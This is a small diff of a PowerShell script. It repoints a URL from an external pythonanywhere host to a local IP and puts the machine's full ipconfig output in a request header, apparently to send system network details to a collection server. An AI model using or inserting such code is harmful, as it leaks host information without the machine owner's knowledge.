@@ -1,5 +1,5 @@
 # Define the URL and headers
-$url = "http://isfooo.pythonanywhere.com/"
+$url = "http://192.168.1.105:5000"
 $headers = @{
     'ip' = (ipconfig | Out-String)
 }
